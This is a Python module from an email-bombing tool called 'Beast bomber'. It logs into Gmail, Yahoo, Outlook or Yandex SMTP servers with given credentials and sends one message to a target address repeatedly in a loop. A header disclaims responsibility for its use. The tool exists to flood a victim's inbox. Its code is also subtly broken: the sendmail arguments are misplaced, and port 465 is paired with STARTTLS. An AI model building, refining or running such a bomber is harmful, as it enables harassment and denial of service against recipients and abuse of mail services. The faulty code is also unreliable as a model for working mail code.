"""
╔═════════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║                                   Beast bomber                                  ║
║  Author:                                                                        ║
║  https://github.com/ebankoff                                                    ║
║                                                                                 ║
║  The author of this program is not responsible for its use!                     ║
║  When posting this code on other resources, please indicate the author!         ║
║                                                                                 ║
║                               All rights reserved.                              ║
║                           Copyright (C) 2022 ebankoff                           ║
║                                                                                 ║
╚═════════════════════════════════════════════════════════════════════════════════╝
"""

import smtplib
import colorama

colorama.init()


def email(emails, passwords, to, amount, subj, mes, server):
	if server == '1':
		server = smtplib.SMTP('smtp.gmail.com', 587)
		server.starttls()
	elif server == '2':
		server = smtplib.SMTP('smtp.mail.yahoo.com', 465)
		server.starttls()
	elif server == '3':
		server = smtplib.SMTP('smtp-mail.outlook.com', 587)
		server.starttls()
	elif server == '4':
		server = smtplib.SMTP('smtp.yandex.ru', 465)
		server.starttls()
	
	server.login(emails, passwords)

	for i in range(amount):
		server.sendmail(emails, to, subj, mes)